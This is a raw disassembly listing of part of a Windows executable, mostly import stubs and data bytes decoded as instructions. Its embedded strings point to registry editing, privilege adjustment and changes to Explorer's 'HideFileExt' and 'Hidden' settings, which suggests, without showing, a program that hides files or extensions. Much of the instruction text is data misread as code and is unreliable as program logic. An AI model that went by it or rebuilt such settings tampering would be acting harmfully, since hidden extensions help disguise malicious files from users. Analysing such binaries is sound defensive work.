  407fb4:	2e 00 64 00 61       	add    %ah,%cs:0x61(%eax,%eax,1)
  407fb9:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  407fbd:	00 00                	add    %al,(%eax)
  407fbf:	00 0c 00             	add    %cl,(%eax,%eax,1)
  407fc2:	0c 00                	or     $0x0,%al
  407fc4:	00 00                	add    %al,(%eax)
  407fc6:	00 00                	add    %al,(%eax)
  407fc8:	0c 00                	or     $0x0,%al
  407fca:	04 04                	add    $0x4,%al
  407fcc:	0c 00                	or     $0x0,%al
  407fce:	08 00                	or     %al,(%eax)
  407fd0:	00 00                	add    %al,(%eax)
  407fd2:	00 00                	add    %al,(%eax)
  407fd4:	08 00                	or     %al,(%eax)
  407fd6:	04 04                	add    $0x4,%al
  407fd8:	0c 00                	or     $0x0,%al
  407fda:	10 00                	adc    %al,(%eax)
  407fdc:	00 00                	add    %al,(%eax)
  407fde:	00 00                	add    %al,(%eax)
  407fe0:	10 00                	adc    %al,(%eax)
  407fe2:	04 04                	add    $0x4,%al
  407fe4:	0d 00 00 00 61       	or     $0x61000000,%eax
  407fe9:	64 76 61             	fs jbe 0x40804d
  407fec:	70 69                	jo     0x408057
  407fee:	33 32                	xor    (%edx),%esi
  407ff0:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  407ff3:	6c                   	insb   (%dx),%es:(%edi)
  407ff4:	00 00                	add    %al,(%eax)
  407ff6:	00 00                	add    %al,(%eax)
  407ff8:	0f 00 00             	sldt   (%eax)
  407ffb:	00 52 65             	add    %dl,0x65(%edx)
  407ffe:	67 53                	addr16 push %ebx
  408000:	65 74 56             	gs je  0x408059
  408003:	61                   	popa
  408004:	6c                   	insb   (%dx),%es:(%edi)
  408005:	75 65                	jne    0x40806c
  408007:	45                   	inc    %ebp
  408008:	78 41                	js     0x40804b
  40800a:	00 00                	add    %al,(%eax)
  40800c:	0c 00                	or     $0x0,%al
  40800e:	00 00                	add    %al,(%eax)
  408010:	46                   	inc    %esi
  408011:	69 6e 64 57 69 6e 64 	imul   $0x646e6957,0x64(%esi),%ebp
  408018:	6f                   	outsl  %ds:(%esi),(%dx)
  408019:	77 41                	ja     0x40805c
  40801b:	00 e8                	add    %ch,%al
  40801d:	7f 40                	jg     0x40805f
  40801f:	00 fc                	add    %bh,%ah
  408021:	7f 40                	jg     0x408063
  408023:	00 00                	add    %al,(%eax)
  408025:	00 04 00             	add    %al,(%eax,%eax,1)
  408028:	54                   	push   %esp
  408029:	c7 40 00 00 00 00 00 	movl   $0x0,0x0(%eax)
  408030:	00 00                	add    %al,(%eax)
  408032:	00 00                	add    %al,(%eax)
  408034:	a1 5c c7 40 00       	mov    0x40c75c,%eax
  408039:	0b c0                	or     %eax,%eax
  40803b:	74 02                	je     0x40803f
  40803d:	ff e0                	jmp    *%eax
  40803f:	68 1c 80 40 00       	push   $0x40801c
  408044:	b8 90 10 40 00       	mov    $0x401090,%eax
  408049:	ff d0                	call   *%eax
  40804b:	ff e0                	jmp    *%eax
  40804d:	00 00                	add    %al,(%eax)
  40804f:	00 11                	add    %dl,(%ecx)
  408051:	00 00                	add    %al,(%eax)
  408053:	00 52 65             	add    %dl,0x65(%edx)
  408056:	67 51                	addr16 push %ecx
  408058:	75 65                	jne    0x4080bf
  40805a:	72 79                	jb     0x4080d5
  40805c:	56                   	push   %esi
  40805d:	61                   	popa
  40805e:	6c                   	insb   (%dx),%es:(%edi)
  40805f:	75 65                	jne    0x4080c6
  408061:	45                   	inc    %ebp
  408062:	78 41                	js     0x4080a5
  408064:	00 00                	add    %al,(%eax)
  408066:	00 00                	add    %al,(%eax)
  408068:	e8 7f 40 00 54       	call   0x5440c0ec
  40806d:	80 40 00 00          	addb   $0x0,0x0(%eax)
  408071:	00 04 00             	add    %al,(%eax,%eax,1)
  408074:	60                   	pusha
  408075:	c7 40 00 00 00 00 00 	movl   $0x0,0x0(%eax)
  40807c:	00 00                	add    %al,(%eax)
  40807e:	00 00                	add    %al,(%eax)
  408080:	a1 68 c7 40 00       	mov    0x40c768,%eax
  408085:	0b c0                	or     %eax,%eax
  408087:	74 02                	je     0x40808b
  408089:	ff e0                	jmp    *%eax
  40808b:	68 68 80 40 00       	push   $0x408068
  408090:	b8 90 10 40 00       	mov    $0x401090,%eax
  408095:	ff d0                	call   *%eax
  408097:	ff e0                	jmp    *%eax
  408099:	00 00                	add    %al,(%eax)
  40809b:	00 0e                	add    %cl,(%esi)
  40809d:	00 00                	add    %al,(%eax)
  40809f:	00 52 65             	add    %dl,0x65(%edx)
  4080a2:	67 4f                	addr16 dec %edi
  4080a4:	70 65                	jo     0x40810b
  4080a6:	6e                   	outsb  %ds:(%esi),(%dx)
  4080a7:	4b                   	dec    %ebx
  4080a8:	65 79 45             	gs jns 0x4080f0
  4080ab:	78 41                	js     0x4080ee
  4080ad:	00 00                	add    %al,(%eax)
  4080af:	00 e8                	add    %ch,%al
  4080b1:	7f 40                	jg     0x4080f3
  4080b3:	00 a0 80 40 00 00    	add    %ah,0x4080(%eax)
  4080b9:	00 04 00             	add    %al,(%eax,%eax,1)
  4080bc:	6c                   	insb   (%dx),%es:(%edi)
  4080bd:	c7 40 00 00 00 00 00 	movl   $0x0,0x0(%eax)
  4080c4:	00 00                	add    %al,(%eax)
  4080c6:	00 00                	add    %al,(%eax)
  4080c8:	a1 74 c7 40 00       	mov    0x40c774,%eax
  4080cd:	0b c0                	or     %eax,%eax
  4080cf:	74 02                	je     0x4080d3
  4080d1:	ff e0                	jmp    *%eax
  4080d3:	68 b0 80 40 00       	push   $0x4080b0
  4080d8:	b8 90 10 40 00       	mov    $0x401090,%eax
  4080dd:	ff d0                	call   *%eax
  4080df:	ff e0                	jmp    *%eax
  4080e1:	00 00                	add    %al,(%eax)
  4080e3:	00 10                	add    %dl,(%eax)
  4080e5:	00 00                	add    %al,(%eax)
  4080e7:	00 52 65             	add    %dl,0x65(%edx)
  4080ea:	67 44                	addr16 inc %esp
  4080ec:	65 6c                	gs insb (%dx),%es:(%edi)
  4080ee:	65 74 65             	gs je  0x408156
  4080f1:	56                   	push   %esi
  4080f2:	61                   	popa
  4080f3:	6c                   	insb   (%dx),%es:(%edi)
  4080f4:	75 65                	jne    0x40815b
  4080f6:	41                   	inc    %ecx
  4080f7:	00 e8                	add    %ch,%al
  4080f9:	7f 40                	jg     0x40813b
  4080fb:	00 e8                	add    %ch,%al
  4080fd:	80 40 00 00          	addb   $0x0,0x0(%eax)
  408101:	00 04 00             	add    %al,(%eax,%eax,1)
  408104:	78 c7                	js     0x4080cd
  408106:	40                   	inc    %eax
	...
  40810f:	00 a1 80 c7 40 00    	add    %ah,0x40c780(%ecx)
  408115:	0b c0                	or     %eax,%eax
  408117:	74 02                	je     0x40811b
  408119:	ff e0                	jmp    *%eax
  40811b:	68 f8 80 40 00       	push   $0x4080f8
  408120:	b8 90 10 40 00       	mov    $0x401090,%eax
  408125:	ff d0                	call   *%eax
  408127:	ff e0                	jmp    *%eax
  408129:	00 00                	add    %al,(%eax)
  40812b:	00 0e                	add    %cl,(%esi)
  40812d:	00 00                	add    %al,(%eax)
  40812f:	00 52 65             	add    %dl,0x65(%edx)
  408132:	67 44                	addr16 inc %esp
  408134:	65 6c                	gs insb (%dx),%es:(%edi)
  408136:	65 74 65             	gs je  0x40819e
  408139:	4b                   	dec    %ebx
  40813a:	65 79 41             	gs jns 0x40817e
  40813d:	00 00                	add    %al,(%eax)
  40813f:	00 e8                	add    %ch,%al
  408141:	7f 40                	jg     0x408183
  408143:	00 30                	add    %dh,(%eax)
  408145:	81 40 00 00 00 04 00 	addl   $0x40000,0x0(%eax)
  40814c:	84 c7                	test   %al,%bh
  40814e:	40                   	inc    %eax
	...
  408157:	00 a1 8c c7 40 00    	add    %ah,0x40c78c(%ecx)
  40815d:	0b c0                	or     %eax,%eax
  40815f:	74 02                	je     0x408163
  408161:	ff e0                	jmp    *%eax
  408163:	68 40 81 40 00       	push   $0x408140
  408168:	b8 90 10 40 00       	mov    $0x401090,%eax
  40816d:	ff d0                	call   *%eax
  40816f:	ff e0                	jmp    *%eax
  408171:	00 00                	add    %al,(%eax)
  408173:	00 10                	add    %dl,(%eax)
  408175:	00 00                	add    %al,(%eax)
  408177:	00 52 65             	add    %dl,0x65(%edx)
  40817a:	67 43                	addr16 inc %ebx
  40817c:	72 65                	jb     0x4081e3
  40817e:	61                   	popa
  40817f:	74 65                	je     0x4081e6
  408181:	4b                   	dec    %ebx
  408182:	65 79 45             	gs jns 0x4081ca
  408185:	78 41                	js     0x4081c8
  408187:	00 e8                	add    %ch,%al
  408189:	7f 40                	jg     0x4081cb
  40818b:	00 78 81             	add    %bh,-0x7f(%eax)
  40818e:	40                   	inc    %eax
  40818f:	00 00                	add    %al,(%eax)
  408191:	00 04 00             	add    %al,(%eax,%eax,1)
  408194:	90                   	nop
  408195:	c7 40 00 00 00 00 00 	movl   $0x0,0x0(%eax)
  40819c:	00 00                	add    %al,(%eax)
  40819e:	00 00                	add    %al,(%eax)
  4081a0:	a1 98 c7 40 00       	mov    0x40c798,%eax
  4081a5:	0b c0                	or     %eax,%eax
  4081a7:	74 02                	je     0x4081ab
  4081a9:	ff e0                	jmp    *%eax
  4081ab:	68 88 81 40 00       	push   $0x408188
  4081b0:	b8 90 10 40 00       	mov    $0x401090,%eax
  4081b5:	ff d0                	call   *%eax
  4081b7:	ff e0                	jmp    *%eax
  4081b9:	00 00                	add    %al,(%eax)
  4081bb:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4081be:	00 00                	add    %al,(%eax)
  4081c0:	52                   	push   %edx
  4081c1:	65 67 43             	gs addr16 inc %ebx
  4081c4:	6c                   	insb   (%dx),%es:(%edi)
  4081c5:	6f                   	outsl  %ds:(%esi),(%dx)
  4081c6:	73 65                	jae    0x40822d
  4081c8:	4b                   	dec    %ebx
  4081c9:	65 79 00             	gs jns 0x4081cc
  4081cc:	16                   	push   %ss
  4081cd:	00 00                	add    %al,(%eax)
  4081cf:	00 48 00             	add    %cl,0x0(%eax)
  4081d2:	69 00 64 00 65 00    	imul   $0x650064,(%eax),%eax
  4081d8:	46                   	inc    %esi
  4081d9:	00 69 00             	add    %ch,0x0(%ecx)
  4081dc:	6c                   	insb   (%dx),%es:(%edi)
  4081dd:	00 65 00             	add    %ah,0x0(%ebp)
  4081e0:	45                   	inc    %ebp
  4081e1:	00 78 00             	add    %bh,0x0(%eax)
  4081e4:	74 00                	je     0x4081e6
  4081e6:	00 00                	add    %al,(%eax)
  4081e8:	e8 7f 40 00 c0       	call   0xc040c26c
  4081ed:	81 40 00 00 00 04 00 	addl   $0x40000,0x0(%eax)
  4081f4:	9c                   	pushf
  4081f5:	c7 40 00 00 00 00 00 	movl   $0x0,0x0(%eax)
  4081fc:	00 00                	add    %al,(%eax)
  4081fe:	00 00                	add    %al,(%eax)
  408200:	a1 a4 c7 40 00       	mov    0x40c7a4,%eax
  408205:	0b c0                	or     %eax,%eax
  408207:	74 02                	je     0x40820b
  408209:	ff e0                	jmp    *%eax
  40820b:	68 e8 81 40 00       	push   $0x4081e8
  408210:	b8 90 10 40 00       	mov    $0x401090,%eax
  408215:	ff d0                	call   *%eax
  408217:	ff e0                	jmp    *%eax
  408219:	00 00                	add    %al,(%eax)
  40821b:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40821e:	00 00                	add    %al,(%eax)
  408220:	52                   	push   %edx
  408221:	65 67 53             	gs addr16 push %ebx
  408224:	61                   	popa
  408225:	76 65                	jbe    0x40828c
  408227:	4b                   	dec    %ebx
  408228:	65 79 41             	gs jns 0x40826c
  40822b:	00 e8                	add    %ch,%al
  40822d:	7f 40                	jg     0x40826f
  40822f:	00 20                	add    %ah,(%eax)
  408231:	82 40 00 00          	addb   $0x0,0x0(%eax)
  408235:	00 04 00             	add    %al,(%eax,%eax,1)
  408238:	a8 c7                	test   $0xc7,%al
  40823a:	40                   	inc    %eax
	...
  408243:	00 a1 b0 c7 40 00    	add    %ah,0x40c7b0(%ecx)
  408249:	0b c0                	or     %eax,%eax
  40824b:	74 02                	je     0x40824f
  40824d:	ff e0                	jmp    *%eax
  40824f:	68 2c 82 40 00       	push   $0x40822c
  408254:	b8 90 10 40 00       	mov    $0x401090,%eax
  408259:	ff d0                	call   *%eax
  40825b:	ff e0                	jmp    *%eax
  40825d:	00 00                	add    %al,(%eax)
  40825f:	00 0f                	add    %cl,(%edi)
  408261:	00 00                	add    %al,(%eax)
  408263:	00 52 65             	add    %dl,0x65(%edx)
  408266:	67 52                	addr16 push %edx
  408268:	65 73 74             	gs jae 0x4082df
  40826b:	6f                   	outsl  %ds:(%esi),(%dx)
  40826c:	72 65                	jb     0x4082d3
  40826e:	4b                   	dec    %ebx
  40826f:	65 79 41             	gs jns 0x4082b3
  408272:	00 00                	add    %al,(%eax)
  408274:	e8 7f 40 00 64       	call   0x6440c2f8
  408279:	82 40 00 00          	addb   $0x0,0x0(%eax)
  40827d:	00 04 00             	add    %al,(%eax,%eax,1)
  408280:	b4 c7                	mov    $0xc7,%ah
  408282:	40                   	inc    %eax
	...
  40828b:	00 a1 bc c7 40 00    	add    %ah,0x40c7bc(%ecx)
  408291:	0b c0                	or     %eax,%eax
  408293:	74 02                	je     0x408297
  408295:	ff e0                	jmp    *%eax
  408297:	68 74 82 40 00       	push   $0x408274
  40829c:	b8 90 10 40 00       	mov    $0x401090,%eax
  4082a1:	ff d0                	call   *%eax
  4082a3:	ff e0                	jmp    *%eax
  4082a5:	00 00                	add    %al,(%eax)
  4082a7:	00 0e                	add    %cl,(%esi)
  4082a9:	00 00                	add    %al,(%eax)
  4082ab:	00 52 65             	add    %dl,0x65(%edx)
  4082ae:	67 45                	addr16 inc %ebp
  4082b0:	6e                   	outsb  %ds:(%esi),(%dx)
  4082b1:	75 6d                	jne    0x408320
  4082b3:	4b                   	dec    %ebx
  4082b4:	65 79 45             	gs jns 0x4082fc
  4082b7:	78 41                	js     0x4082fa
  4082b9:	00 00                	add    %al,(%eax)
  4082bb:	00 e8                	add    %ch,%al
  4082bd:	7f 40                	jg     0x4082ff
  4082bf:	00 ac 82 40 00 00 00 	add    %ch,0x40(%edx,%eax,4)
  4082c6:	04 00                	add    $0x0,%al
  4082c8:	c0 c7 40             	rol    $0x40,%bh
	...
  4082d3:	00 a1 c8 c7 40 00    	add    %ah,0x40c7c8(%ecx)
  4082d9:	0b c0                	or     %eax,%eax
  4082db:	74 02                	je     0x4082df
  4082dd:	ff e0                	jmp    *%eax
  4082df:	68 bc 82 40 00       	push   $0x4082bc
  4082e4:	b8 90 10 40 00       	mov    $0x401090,%eax
  4082e9:	ff d0                	call   *%eax
  4082eb:	ff e0                	jmp    *%eax
  4082ed:	00 00                	add    %al,(%eax)
  4082ef:	00 0e                	add    %cl,(%esi)
  4082f1:	00 00                	add    %al,(%eax)
  4082f3:	00 52 65             	add    %dl,0x65(%edx)
  4082f6:	67 45                	addr16 inc %ebp
  4082f8:	6e                   	outsb  %ds:(%esi),(%dx)
  4082f9:	75 6d                	jne    0x408368
  4082fb:	56                   	push   %esi
  4082fc:	61                   	popa
  4082fd:	6c                   	insb   (%dx),%es:(%edi)
  4082fe:	75 65                	jne    0x408365
  408300:	41                   	inc    %ecx
  408301:	00 00                	add    %al,(%eax)
  408303:	00 e8                	add    %ch,%al
  408305:	7f 40                	jg     0x408347
  408307:	00 f4                	add    %dh,%ah
  408309:	82 40 00 00          	addb   $0x0,0x0(%eax)
  40830d:	00 04 00             	add    %al,(%eax,%eax,1)
  408310:	cc                   	int3
  408311:	c7 40 00 00 00 00 00 	movl   $0x0,0x0(%eax)
  408318:	00 00                	add    %al,(%eax)
  40831a:	00 00                	add    %al,(%eax)
  40831c:	a1 d4 c7 40 00       	mov    0x40c7d4,%eax
  408321:	0b c0                	or     %eax,%eax
  408323:	74 02                	je     0x408327
  408325:	ff e0                	jmp    *%eax
  408327:	68 04 83 40 00       	push   $0x408304
  40832c:	b8 90 10 40 00       	mov    $0x401090,%eax
  408331:	ff d0                	call   *%eax
  408333:	ff e0                	jmp    *%eax
  408335:	00 00                	add    %al,(%eax)
  408337:	00 0e                	add    %cl,(%esi)
  408339:	00 00                	add    %al,(%eax)
  40833b:	00 52 65             	add    %dl,0x65(%edx)
  40833e:	67 43                	addr16 inc %ebx
  408340:	72 65                	jb     0x4083a7
  408342:	61                   	popa
  408343:	74 65                	je     0x4083aa
  408345:	4b                   	dec    %ebx
  408346:	65 79 41             	gs jns 0x40838a
  408349:	00 00                	add    %al,(%eax)
  40834b:	00 e8                	add    %ch,%al
  40834d:	7f 40                	jg     0x40838f
  40834f:	00 3c 83             	add    %bh,(%ebx,%eax,4)
  408352:	40                   	inc    %eax
  408353:	00 00                	add    %al,(%eax)
  408355:	00 04 00             	add    %al,(%eax,%eax,1)
  408358:	d8 c7                	fadd   %st(7),%st
  40835a:	40                   	inc    %eax
	...
  408363:	00 a1 e0 c7 40 00    	add    %ah,0x40c7e0(%ecx)
  408369:	0b c0                	or     %eax,%eax
  40836b:	74 02                	je     0x40836f
  40836d:	ff e0                	jmp    *%eax
  40836f:	68 4c 83 40 00       	push   $0x40834c
  408374:	b8 90 10 40 00       	mov    $0x401090,%eax
  408379:	ff d0                	call   *%eax
  40837b:	ff e0                	jmp    *%eax
  40837d:	00 00                	add    %al,(%eax)
  40837f:	00 16                	add    %dl,(%esi)
  408381:	00 00                	add    %al,(%eax)
  408383:	00 41 64             	add    %al,0x64(%ecx)
  408386:	6a 75                	push   $0x75
  408388:	73 74                	jae    0x4083fe
  40838a:	54                   	push   %esp
  40838b:	6f                   	outsl  %ds:(%esi),(%dx)
  40838c:	6b 65 6e 50          	imul   $0x50,0x6e(%ebp),%esp
  408390:	72 69                	jb     0x4083fb
  408392:	76 69                	jbe    0x4083fd
  408394:	6c                   	insb   (%dx),%es:(%edi)
  408395:	65 67 65 73 00       	gs addr16 gs jae 0x40839a
  40839a:	00 00                	add    %al,(%eax)
  40839c:	07                   	pop    %es
  40839d:	00 00                	add    %al,(%eax)
  40839f:	00 75 73             	add    %dh,0x73(%ebp)
  4083a2:	65 72 33             	gs jb  0x4083d8
  4083a5:	32 00                	xor    (%eax),%al
  4083a7:	00 e8                	add    %ch,%al
  4083a9:	7f 40                	jg     0x4083eb
  4083ab:	00 84 83 40 00 00 00 	add    %al,0x40(%ebx,%eax,4)
  4083b2:	04 00                	add    $0x0,%al
  4083b4:	e4 c7                	in     $0xc7,%al
  4083b6:	40                   	inc    %eax
	...
  4083bf:	00 a1 ec c7 40 00    	add    %ah,0x40c7ec(%ecx)
  4083c5:	0b c0                	or     %eax,%eax
  4083c7:	74 02                	je     0x4083cb
  4083c9:	ff e0                	jmp    *%eax
  4083cb:	68 a8 83 40 00       	push   $0x4083a8
  4083d0:	b8 90 10 40 00       	mov    $0x401090,%eax
  4083d5:	ff d0                	call   *%eax
  4083d7:	ff e0                	jmp    *%eax
  4083d9:	00 00                	add    %al,(%eax)
  4083db:	00 16                	add    %dl,(%esi)
  4083dd:	00 00                	add    %al,(%eax)
  4083df:	00 4c 6f 6f          	add    %cl,0x6f(%edi,%ebp,2)
  4083e3:	6b 75 70 50          	imul   $0x50,0x70(%ebp),%esi
  4083e7:	72 69                	jb     0x408452
  4083e9:	76 69                	jbe    0x408454
  4083eb:	6c                   	insb   (%dx),%es:(%edi)
  4083ec:	65 67 65 56          	gs addr16 gs push %esi
  4083f0:	61                   	popa
  4083f1:	6c                   	insb   (%dx),%es:(%edi)
  4083f2:	75 65                	jne    0x408459
  4083f4:	41                   	inc    %ecx
  4083f5:	00 00                	add    %al,(%eax)
  4083f7:	00 e8                	add    %ch,%al
  4083f9:	7f 40                	jg     0x40843b
  4083fb:	00 e0                	add    %ah,%al
  4083fd:	83 40 00 00          	addl   $0x0,0x0(%eax)
  408401:	00 04 00             	add    %al,(%eax,%eax,1)
  408404:	f0 c7 40 00 00 00 00 	lock movl $0x0,0x0(%eax)
  40840b:	00 
  40840c:	00 00                	add    %al,(%eax)
  40840e:	00 00                	add    %al,(%eax)
  408410:	a1 f8 c7 40 00       	mov    0x40c7f8,%eax
  408415:	0b c0                	or     %eax,%eax
  408417:	74 02                	je     0x40841b
  408419:	ff e0                	jmp    *%eax
  40841b:	68 f8 83 40 00       	push   $0x4083f8
  408420:	b8 90 10 40 00       	mov    $0x401090,%eax
  408425:	ff d0                	call   *%eax
  408427:	ff e0                	jmp    *%eax
  408429:	00 00                	add    %al,(%eax)
  40842b:	00 11                	add    %dl,(%ecx)
  40842d:	00 00                	add    %al,(%eax)
  40842f:	00 4f 70             	add    %cl,0x70(%edi)
  408432:	65 6e                	outsb  %gs:(%esi),(%dx)
  408434:	50                   	push   %eax
  408435:	72 6f                	jb     0x4084a6
  408437:	63 65 73             	arpl   %esp,0x73(%ebp)
  40843a:	73 54                	jae    0x408490
  40843c:	6f                   	outsl  %ds:(%esi),(%dx)
  40843d:	6b 65 6e 00          	imul   $0x0,0x6e(%ebp),%esp
  408441:	00 00                	add    %al,(%eax)
  408443:	00 e8                	add    %ch,%al
  408445:	7f 40                	jg     0x408487
  408447:	00 30                	add    %dh,(%eax)
  408449:	84 40 00             	test   %al,0x0(%eax)
  40844c:	00 00                	add    %al,(%eax)
  40844e:	04 00                	add    $0x0,%al
  408450:	fc                   	cld
  408451:	c7 40 00 00 00 00 00 	movl   $0x0,0x0(%eax)
  408458:	00 00                	add    %al,(%eax)
  40845a:	00 00                	add    %al,(%eax)
  40845c:	a1 04 c8 40 00       	mov    0x40c804,%eax
  408461:	0b c0                	or     %eax,%eax
  408463:	74 02                	je     0x408467
  408465:	ff e0                	jmp    *%eax
  408467:	68 44 84 40 00       	push   $0x408444
  40846c:	b8 90 10 40 00       	mov    $0x401090,%eax
  408471:	ff d0                	call   *%eax
  408473:	ff e0                	jmp    *%eax
  408475:	00 00                	add    %al,(%eax)
  408477:	00 12                	add    %dl,(%edx)
  408479:	00 00                	add    %al,(%eax)
  40847b:	00 47 65             	add    %al,0x65(%edi)
  40847e:	74 43                	je     0x4084c3
  408480:	75 72                	jne    0x4084f4
  408482:	72 65                	jb     0x4084e9
  408484:	6e                   	outsb  %ds:(%esi),(%dx)
  408485:	74 50                	je     0x4084d7
  408487:	72 6f                	jb     0x4084f8
  408489:	63 65 73             	arpl   %esp,0x73(%ebp)
  40848c:	73 00                	jae    0x40848e
  40848e:	00 00                	add    %al,(%eax)
  408490:	d8 7c 40 00          	fdivrs 0x0(%eax,%eax,2)
  408494:	7c 84                	jl     0x40841a
  408496:	40                   	inc    %eax
  408497:	00 00                	add    %al,(%eax)
  408499:	00 04 00             	add    %al,(%eax,%eax,1)
  40849c:	08 c8                	or     %cl,%al
  40849e:	40                   	inc    %eax
	...
  4084a7:	00 a1 10 c8 40 00    	add    %ah,0x40c810(%ecx)
  4084ad:	0b c0                	or     %eax,%eax
  4084af:	74 02                	je     0x4084b3
  4084b1:	ff e0                	jmp    *%eax
  4084b3:	68 90 84 40 00       	push   $0x408490
  4084b8:	b8 90 10 40 00       	mov    $0x401090,%eax
  4084bd:	ff d0                	call   *%eax
  4084bf:	ff e0                	jmp    *%eax
  4084c1:	00 00                	add    %al,(%eax)
  4084c3:	00 64 00 00          	add    %ah,0x0(%eax,%eax,1)
  4084c7:	00 53 00             	add    %dl,0x0(%ebx)
  4084ca:	6f                   	outsl  %ds:(%esi),(%dx)
  4084cb:	00 66 00             	add    %ah,0x0(%esi)
  4084ce:	74 00                	je     0x4084d0
  4084d0:	77 00                	ja     0x4084d2
  4084d2:	61                   	popa
  4084d3:	00 72 00             	add    %dh,0x0(%edx)
  4084d6:	65 00 5c 00 4d       	add    %bl,%gs:0x4d(%eax,%eax,1)
  4084db:	00 69 00             	add    %ch,0x0(%ecx)
  4084de:	63 00                	arpl   %eax,(%eax)
  4084e0:	72 00                	jb     0x4084e2
  4084e2:	6f                   	outsl  %ds:(%esi),(%dx)
  4084e3:	00 73 00             	add    %dh,0x0(%ebx)
  4084e6:	6f                   	outsl  %ds:(%esi),(%dx)
  4084e7:	00 66 00             	add    %ah,0x0(%esi)
  4084ea:	74 00                	je     0x4084ec
  4084ec:	5c                   	pop    %esp
  4084ed:	00 57 00             	add    %dl,0x0(%edi)
  4084f0:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  4084f6:	6f                   	outsl  %ds:(%esi),(%dx)
  4084f7:	00 77 00             	add    %dh,0x0(%edi)
  4084fa:	73 00                	jae    0x4084fc
  4084fc:	5c                   	pop    %esp
  4084fd:	00 43 00             	add    %al,0x0(%ebx)
  408500:	75 00                	jne    0x408502
  408502:	72 00                	jb     0x408504
  408504:	72 00                	jb     0x408506
  408506:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40850a:	74 00                	je     0x40850c
  40850c:	56                   	push   %esi
  40850d:	00 65 00             	add    %ah,0x0(%ebp)
  408510:	72 00                	jb     0x408512
  408512:	73 00                	jae    0x408514
  408514:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40851a:	5c                   	pop    %esp
  40851b:	00 45 00             	add    %al,0x0(%ebp)
  40851e:	78 00                	js     0x408520
  408520:	70 00                	jo     0x408522
  408522:	6c                   	insb   (%dx),%es:(%edi)
  408523:	00 6f 00             	add    %ch,0x0(%edi)
  408526:	72 00                	jb     0x408528
  408528:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40852c:	00 00                	add    %al,(%eax)
  40852e:	00 00                	add    %al,(%eax)
  408530:	1e                   	push   %ds
  408531:	00 00                	add    %al,(%eax)
  408533:	00 4c 00 6f          	add    %cl,0x6f(%eax,%eax,1)
  408537:	00 67 00             	add    %ah,0x0(%edi)
  40853a:	6f                   	outsl  %ds:(%esi),(%dx)
  40853b:	00 6e 00             	add    %ch,0x0(%esi)
  40853e:	20 00                	and    %al,(%eax)
  408540:	55                   	push   %ebp
  408541:	00 73 00             	add    %dh,0x0(%ebx)
  408544:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  408548:	20 00                	and    %al,(%eax)
  40854a:	4e                   	dec    %esi
  40854b:	00 61 00             	add    %ah,0x0(%ecx)
  40854e:	6d                   	insl   (%dx),%es:(%edi)
  40854f:	00 65 00             	add    %ah,0x0(%ebp)
  408552:	00 00                	add    %al,(%eax)
  408554:	08 00                	or     %al,(%eax)
  408556:	00 00                	add    %al,(%eax)
  408558:	2e 00 7a 00          	add    %bh,%cs:0x0(%edx)
  40855c:	69 00 70 00 00 00    	imul   $0x70,(%eax),%eax
  408562:	00 00                	add    %al,(%eax)
  408564:	0c 00                	or     $0x0,%al
  408566:	00 00                	add    %al,(%eax)
  408568:	48                   	dec    %eax
  408569:	00 69 00             	add    %ch,0x0(%ecx)
  40856c:	64 00 64 00 65       	add    %ah,%fs:0x65(%eax,%eax,1)
  408571:	00 6e 00             	add    %ch,0x0(%esi)
	...
  40857c:	0a 00                	or     (%eax),%al
  40857e:	00 00                	add    %al,(%eax)
  408580:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  408584:	78 00                	js     0x408586
  408586:	65 00 20             	add    %ah,%gs:(%eax)
  408589:	00 00                	add    %al,(%eax)
  40858b:	00 7e 00             	add    %bh,0x0(%esi)
  40858e:	00 00                	add    %al,(%eax)
  408590:	53                   	push   %ebx
  408591:	00 4f 00             	add    %cl,0x0(%edi)
  408594:	46                   	inc    %esi
  408595:	00 54 00 57          	add    %dl,0x57(%eax,%eax,1)
  408599:	00 41 00             	add    %al,0x0(%ecx)
  40859c:	52                   	push   %edx
  40859d:	00 45 00             	add    %al,0x0(%ebp)
  4085a0:	5c                   	pop    %esp
  4085a1:	00 4d 00             	add    %cl,0x0(%ebp)
  4085a4:	69 00 63 00 72 00    	imul   $0x720063,(%eax),%eax
  4085aa:	6f                   	outsl  %ds:(%esi),(%dx)
  4085ab:	00 73 00             	add    %dh,0x0(%ebx)
  4085ae:	6f                   	outsl  %ds:(%esi),(%dx)
  4085af:	00 66 00             	add    %ah,0x0(%esi)
  4085b2:	74 00                	je     0x4085b4
  4085b4:	5c                   	pop    %esp
  4085b5:	00 57 00             	add    %dl,0x0(%edi)
  4085b8:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  4085be:	6f                   	outsl  %ds:(%esi),(%dx)
  4085bf:	00 77 00             	add    %dh,0x0(%edi)
  4085c2:	73 00                	jae    0x4085c4
  4085c4:	5c                   	pop    %esp
  4085c5:	00 43 00             	add    %al,0x0(%ebx)
  4085c8:	75 00                	jne    0x4085ca
  4085ca:	72 00                	jb     0x4085cc
  4085cc:	72 00                	jb     0x4085ce
  4085ce:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  4085d2:	74 00                	je     0x4085d4
  4085d4:	56                   	push   %esi
  4085d5:	00 65 00             	add    %ah,0x0(%ebp)
  4085d8:	72 00                	jb     0x4085da
  4085da:	73 00                	jae    0x4085dc
  4085dc:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  4085e2:	5c                   	pop    %esp
  4085e3:	00 45 00             	add    %al,0x0(%ebp)
  4085e6:	78 00                	js     0x4085e8
  4085e8:	70 00                	jo     0x4085ea
  4085ea:	6c                   	insb   (%dx),%es:(%edi)
  4085eb:	00 6f 00             	add    %ch,0x0(%edi)
  4085ee:	72 00                	jb     0x4085f0
  4085f0:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4085f4:	5c                   	pop    %esp
  4085f5:	00 43 00             	add    %al,0x0(%ebx)
  4085f8:	61                   	popa
  4085f9:	00 62 00             	add    %ah,0x0(%edx)
  4085fc:	69 00 6e 00 65 00    	imul   $0x65006e,(%eax),%eax
  408602:	74 00                	je     0x408604
  408604:	53                   	push   %ebx
